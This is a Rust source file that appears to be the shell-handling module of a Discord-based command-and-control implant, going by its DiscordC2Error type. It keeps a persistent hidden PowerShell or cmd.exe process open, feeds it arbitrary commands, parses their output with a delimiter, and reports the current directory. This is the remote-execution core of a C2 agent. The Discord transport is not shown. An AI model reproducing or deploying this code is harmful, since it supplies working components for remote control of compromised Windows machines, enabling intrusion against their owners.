use crate::errors::DiscordC2Error;

use std::{path::Path, process::Stdio, sync::Arc};

use tokio::{
    io::{AsyncBufReadExt, AsyncWriteExt, BufReader},
    process::{Child, Command},
    sync::Mutex,
    time::{timeout, Duration},
};

use lazy_static::lazy_static;
use regex::Regex;

#[derive(Clone, PartialEq, Eq, Debug, Copy)]
pub enum ShellType {
    Powershell,
    Cmd,
}

impl ShellType {
    pub fn as_str(&self) -> &str {
        match self {
            ShellType::Powershell => "powershell.exe",
            ShellType::Cmd => "cmd.exe",
        }
    }

    // This gets rid of the command delimter from our stdout
    fn format_output(&self, s: &str) -> String {
        match self {
            ShellType::Powershell => s.replace("; echo ___CMDDELIM___", ""),
            ShellType::Cmd => s.replace("& echo ___CMDDELIM___", ""),
        }
    }

    /// Handles writing the specified `command` to the standard input of the underlying shell process,
    /// based on the `ShellType` and the provided `handler`.
    /// Returns `Ok(())` if the write operation is successful, or an error of type `DiscordC2Error` if there was a problem.
    async fn handle_stdin(
        &self,
        handler: &ProcessHandler,
        command: &str,
    ) -> Result<(), DiscordC2Error> {
        let mut process = handler.process.lock().await;

        match self {
            ShellType::Powershell => {
                process
                    .stdin
                    .as_mut()
                    .unwrap()
                    .write_all(command.as_bytes())
                    .await?;
                process
                    .stdin
                    .as_mut()
                    .unwrap()
                    .write_all(b"; echo ___CMDDELIM___")
                    .await?;
                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
                process.stdin.as_mut().unwrap().flush().await?;
                Ok(())
            }
            ShellType::Cmd => {
                process
                    .stdin
                    .as_mut()
                    .unwrap()
                    .write_all(command.as_bytes())
                    .await?;
                process
                    .stdin
                    .as_mut()
                    .unwrap()
                    .write_all(b" & echo ___CMDDELIM___")
                    .await?;
                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
                process.stdin.as_mut().unwrap().flush().await?;
                Ok(())
            }
        }
    }

    async fn get_current_dir(&self, handler: &ProcessHandler) -> Result<String, DiscordC2Error> {
        let mut process = handler.process.lock().await;

        let stdin_success: Result<ShellType, DiscordC2Error> = match self {
            ShellType::Powershell => {
                process
                    .stdin
                    .as_mut()
                    .unwrap()
                    .write_all("(Get-Location).Path".as_bytes())
                    .await?;
                process
                    .stdin
                    .as_mut()
                    .unwrap()
                    .write_all(b"; echo ___CMDDELIM___")
                    .await?;
                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
                process.stdin.as_mut().unwrap().flush().await?;
                Ok(ShellType::Powershell)
            }
            ShellType::Cmd => {
                process
                    .stdin
                    .as_mut()
                    .unwrap()
                    .write_all("cd".as_bytes())
                    .await?;
                process
                    .stdin
                    .as_mut()
                    .unwrap()
                    .write_all(b" & echo ___CMDDELIM___")
                    .await?;
                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
                process.stdin.as_mut().unwrap().flush().await?;
                Ok(ShellType::Cmd)
            }
        };

        // Declare new string buffer
        let mut output = String::new();

        // Read the result of the cwd command
        let stdout_reader = BufReader::new(process.stdout.as_mut().unwrap());
        let mut out_lines = stdout_reader.lines();
        while let Some(line) = out_lines.next_line().await? {
            if !line.contains("echo") && line.contains("___CMDDELIM___") {
                break;
            }
            output.push_str(&line);
            output.push('\n');
        }

        let formatted_output = stdin_success?.format_output(&output);
        println!("formatted_output: {}", formatted_output);
        Ok(formatted_output)
    }
}

lazy_static! {
    static ref PROCESS_HANDLER: Mutex<Option<Arc<ProcessHandler>>> = Mutex::new(None);
}

#[derive(Debug)]
pub struct ProcessHandler {
    pub shell_type: ShellType,
    process: Arc<Mutex<Child>>,
}

//TODO: massive cleanup needs to be done here
impl ProcessHandler {
    /// Creates a new instance of `ProcessHandler` with the specified `shell_type`.
    /// Returns the created instance wrapped in a `Result` if successful, or an error of type `DiscordC2Error` if there was a problem.
    async fn new(shell_type: ShellType) -> Result<Self, DiscordC2Error> {
        // Open a new shell process based on the provided `shell_type`
        let process = open_shell(shell_type).await?;

        // Create a new `ProcessHandler` instance with the shell type and the process wrapped in an `Arc<Mutex>`
        Ok(ProcessHandler {
            shell_type,
            process: Arc::new(Mutex::new(process)),
        })
    }

    /// Retrieves the instance of `ProcessHandler` based on the specified `shell_type`.
    /// If an instance doesn't exist, it creates a new one using the `new` function.
    /// Returns the `ProcessHandler` instance wrapped in a `Result` if successful, or an error of type `DiscordC2Error` if there was a problem.
    pub async fn instance(shell_type: &ShellType) -> Result<Arc<Self>, DiscordC2Error> {
        // Acquire the lock on the global `PROCESS_HANDLER` instance
        let mut process_handler = PROCESS_HANDLER.lock().await;

        // Check if an instance already exists
        if process_handler.is_none() {
            // Create a new instance using the `new` function and store it in the global `PROCESS_HANDLER`
            let instance = ProcessHandler::new(*shell_type).await?;
            *process_handler = Some(Arc::new(instance));
        }

        // Return the `ProcessHandler` instance
        Ok(process_handler.as_ref().unwrap().clone())
    }

    pub async fn run_command(&self, command: &str) -> Result<String, DiscordC2Error> {
        // Write the command to the stdin of the process
        self.shell_type.handle_stdin(self, command).await?;
        let mut output = String::new();

        async fn read_stderr(process: Arc<Mutex<Child>>) -> Option<String> {
            let mut process = process.lock().await;
            let stderr_reader = BufReader::new(process.stderr.as_mut().unwrap());
            let mut err_lines = stderr_reader.lines();
            let mut output = String::new();

            // Have to find a better way to do this...
            loop {
                match timeout(Duration::from_millis(10), err_lines.next_line()).await {
                    Ok(line_result) => match line_result {
                        Ok(Some(line)) => {
                            if !line.is_empty() {
                                eprintln!("stderr: {}", line);
                                output.push_str(&line);
                                output.push('\n');
                            }
                        }
                        Ok(None) => {
                            eprintln!("Stopped reading stderr");
                            break;
                        }
                        Err(e) => {
                            eprintln!("Error reading stderr: {}", e);
                            break;
                        }
                    },
                    Err(_) => {
                        eprintln!("Timeout while reading stderr");
                        break;
                    }
                }
            }

            if !output.is_empty() {
                Some(output)
            } else {
                None
            }
        }

        let stderr = read_stderr(Arc::clone(&self.process)).await;
        println!("stderr: {:?}", stderr);

        let mut process = self.process.lock().await;

        // Read the process's stdout line by line
        let stdout_reader = BufReader::new(process.stdout.as_mut().unwrap());
        let mut out_lines = stdout_reader.lines();
        while let Some(line) = out_lines.next_line().await? {
            if !line.contains("echo") && line.contains("___CMDDELIM___") {
                break;
            }
            output.push_str(&line);
            output.push('\n');
        }

        let formatted_output = self.shell_type.format_output(&output);

        Ok(formatted_output)
    }

    /// Sends an exit command to the shell process and performs cleanup.
    /// Returns `Ok(())` if the exit operation is successful, or an error of type `DiscordC2Error` if there was a problem.
    pub async fn exit(&self) -> Result<(), DiscordC2Error> {
        let mut process = self.process.lock().await;

        // Send an exit command to the process's stdin based on the shell type
        let exit_command = match self.shell_type.as_str() {
            "cmd.exe" => "exit",
            "powershell.exe" => {
                println!("Exiting the process");
                "exit"
            }
            _ => panic!("Unsupported shell type"),
        };

        process
            .stdin
            .as_mut()
            .unwrap()
            .write_all(exit_command.as_bytes())
            .await?;
        process.stdin.as_mut().unwrap().write_all(b"\n").await?;
        process.kill().await?;

        let mut process_handler = PROCESS_HANDLER.lock().await;
        *process_handler = None;
        println!("{:?}", process_handler);

        Ok(())
    }

    /// Retrieves the current working directory based on the shell type.
    /// Returns the working directory as a `String` if it exists, or an error of type `DiscordC2Error` if there was a problem.
    pub async fn current_working_directory(&self) -> Result<String, DiscordC2Error> {
        let formatted_output = self.shell_type.get_current_dir(self).await?;

        let regex = match self.shell_type {
            ShellType::Powershell => Regex::new(r"\(Get-Location\)\.Path\n(\S+)"),
            ShellType::Cmd => Regex::new(r"cd\s\n(\S+)"),
        }
        .map_err(|e| DiscordC2Error::RegexError(e.to_string()))?;

        let rexed = if let Some(captured) = regex.captures(&formatted_output) {
            captured
                .get(1)
                .ok_or(DiscordC2Error::RegexError(format!(
                    "Couldn't extract the working directory from formatted_output: {}",
                    formatted_output
                )))?
                .as_str()
        } else {
            return Err(DiscordC2Error::RegexError(format!(
                "Couldn't extract the working directory for {:?}: {}",
                self.shell_type, formatted_output
            )));
        };

        if Path::new(&rexed).exists() {
            Ok(String::from(rexed))
        } else {
            Err(DiscordC2Error::RegexError(format!(
                "The rexed path doesn't exist (Path: {})",
                rexed
            )))
        }
    }
}

/// Opens a new shell process of the specified `shell_type`.
/// Returns a `Child` process representing the opened shell if successful, or an error of type `DiscordC2Error` if there was a problem.
async fn open_shell(shell_type: ShellType) -> Result<Child, DiscordC2Error> {
    // Create a new command (tokio) to open the shell
    // Create a new command (tokio) to open the shell
    let child = Command::new(shell_type.as_str())
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(DiscordC2Error::from)?;

    // Return the child process representing the opened shell
    Ok(child)
}